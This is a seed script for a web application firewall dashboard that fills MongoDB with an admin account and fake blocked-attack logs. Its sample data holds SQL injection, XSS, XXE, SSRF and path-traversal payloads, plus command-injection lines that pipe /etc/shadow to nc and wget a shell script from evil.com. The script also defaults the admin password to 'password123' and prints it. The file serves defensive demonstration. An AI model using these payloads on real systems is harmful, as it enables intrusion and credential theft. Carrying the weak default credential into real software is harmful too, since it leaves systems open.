// PATH: server/src/utils/seed.js
require('dotenv').config({ path: require('path').join(__dirname, '../../.env') })
const mongoose = require('mongoose')
const User = require('../models/User')
const Rule = require('../models/Rule')
const Log = require('../models/Log')
const { DEFAULT_RULES } = require('../config/rules')

const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/shieldwaf'
const ADMIN_EMAIL = process.env.SEED_EMAIL || 'admin@shieldwaf.io'
const ADMIN_PASSWORD = process.env.SEED_PASSWORD || 'password123'

const SAMPLE_IPS = [
    { ip: '185.220.101.4', country: 'Russia', flag: '🇷🇺', code: 'RU' },
    { ip: '103.21.244.0', country: 'China', flag: '🇨🇳', code: 'CN' },
    { ip: '91.108.4.116', country: 'USA', flag: '🇺🇸', code: 'US' },
    { ip: '178.62.55.19', country: 'Germany', flag: '🇩🇪', code: 'DE' },
    { ip: '104.21.19.81', country: 'Brazil', flag: '🇧🇷', code: 'BR' },
    { ip: '5.188.10.51', country: 'Netherlands', flag: '🇳🇱', code: 'NL' },
    { ip: '172.16.0.45', country: 'India', flag: '🇮🇳', code: 'IN' },
    { ip: '45.155.205.4', country: 'Russia', flag: '🇷🇺', code: 'RU' },
    { ip: '8.8.8.8', country: 'USA', flag: '🇺🇸', code: 'US' },
]

const ATTACK_SAMPLES = [
    { type: 'SQL Injection', sev: 'Critical', risk: 97, action: 'Blocked', payload: "'; DROP TABLE users;--", path: '/api/login', method: 'POST', rule: 'SQL Injection Blocker' },
    { type: 'XSS', sev: 'High', risk: 82, action: 'Blocked', payload: '<script>alert(document.cookie)</script>', path: '/api/search', method: 'GET', rule: 'XSS Filter' },
    { type: 'SQL Injection', sev: 'Low', risk: 12, action: 'Allowed', payload: '/api/users?id=1&role=admin', path: '/api/users', method: 'GET', rule: '' },
    { type: 'Path Traversal', sev: 'High', risk: 88, action: 'Blocked', payload: '../../../etc/passwd', path: '/api/files', method: 'POST', rule: 'Path Traversal Guard' },
    { type: 'Command Injection', sev: 'Critical', risk: 99, action: 'Blocked', payload: '; cat /etc/shadow | nc 10.0.0.1', path: '/api/exec', method: 'DELETE', rule: 'Command Injection Shield' },
    { type: 'SSRF', sev: 'Critical', risk: 95, action: 'Blocked', payload: 'http://169.254.169.254/latest/meta-data', path: '/api/fetch', method: 'POST', rule: 'SSRF Blocker' },
    { type: 'XSS', sev: 'High', risk: 78, action: 'Blocked', payload: '<img src=x onerror=alert(1)>', path: '/api/comments', method: 'GET', rule: 'XSS Filter' },
    { type: 'Brute Force', sev: 'Medium', risk: 55, action: 'Warning', payload: '/admin/login [800 attempts]', path: '/admin/login', method: 'GET', rule: 'Brute Force Rate Limiter' },
    { type: 'XXE', sev: 'Critical', risk: 93, action: 'Blocked', payload: '<!ENTITY xxe SYSTEM "file:///etc/passwd">', path: '/api/xml', method: 'PUT', rule: 'XXE Injection Prevention' },
    { type: 'SQL Injection', sev: 'Low', risk: 5, action: 'Allowed', payload: '/api/products?search=laptop', path: '/api/products', method: 'GET', rule: '' },
    { type: 'SQL Injection', sev: 'Critical', risk: 96, action: 'Blocked', payload: "1' OR '1'='1", path: '/api/auth', method: 'POST', rule: 'SQL Injection Blocker' },
    { type: 'Path Traversal', sev: 'High', risk: 84, action: 'Blocked', payload: '../../config/database.yml', path: '/api/config', method: 'GET', rule: 'Path Traversal Guard' },
    { type: 'XSS', sev: 'High', risk: 79, action: 'Blocked', payload: 'javascript:alert(document.domain)', path: '/api/redirect', method: 'GET', rule: 'XSS Filter' },
    { type: 'SSRF', sev: 'Critical', risk: 91, action: 'Blocked', payload: 'http://192.168.1.1/admin', path: '/api/webhook', method: 'POST', rule: 'SSRF Blocker' },
    { type: 'Command Injection', sev: 'Critical', risk: 98, action: 'Blocked', payload: '`id` && wget http://evil.com/shell.sh', path: '/api/ping', method: 'POST', rule: 'Command Injection Shield' },
]

const rb = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a
const randomDate = (days) => new Date(Date.now() - rb(0, days * 86400000))

async function seed() {
    try {
        console.log('Connecting to MongoDB...')
        await mongoose.connect(MONGO_URI)
        console.log('Connected\n')

        console.log('Clearing existing data...')
        await Promise.all([User.deleteMany({}), Rule.deleteMany({}), Log.deleteMany({})])

        // IMPORTANT: pass plain text — User model's pre("save") hook hashes it automatically
        console.log('Creating admin user...')
        await User.create({
            name: 'Admin User',
            email: ADMIN_EMAIL,
            password: ADMIN_PASSWORD,
            role: 'admin',
            isActive: true,
        })
        console.log('  admin created:', ADMIN_EMAIL)

        console.log('Creating WAF rules...')
        await Rule.insertMany(DEFAULT_RULES)
        console.log(' ', DEFAULT_RULES.length, 'rules created')

        console.log('Generating logs...')
        const logs = Array.from({ length: 80 }, (_, i) => {
            const s = ATTACK_SAMPLES[i % ATTACK_SAMPLES.length]
            const ip = SAMPLE_IPS[rb(0, SAMPLE_IPS.length - 1)]
            return {
                timestamp: randomDate(7),
                ip: ip.ip,
                country: ip.country,
                countryFlag: ip.flag,
                countryCode: ip.code,
                method: s.method,
                path: s.path,
                attackType: s.type,
                payload: s.payload,
                severity: s.sev,
                riskScore: Math.min(100, s.risk + rb(-5, 5)),
                action: s.action,
                ruleTriggered: s.rule,
                userAgent: 'Mozilla/5.0 (AttackBot)',
            }
        })
        await Log.insertMany(logs)
        console.log(' ', logs.length, 'logs created')

        console.log('\nSeed complete!')
        console.log('Email:   ', ADMIN_EMAIL)
        console.log('Password:', ADMIN_PASSWORD)
        process.exit(0)
    } catch (err) {
        console.error('Seed failed:', err.message)
        process.exit(1)
    }
}

seed()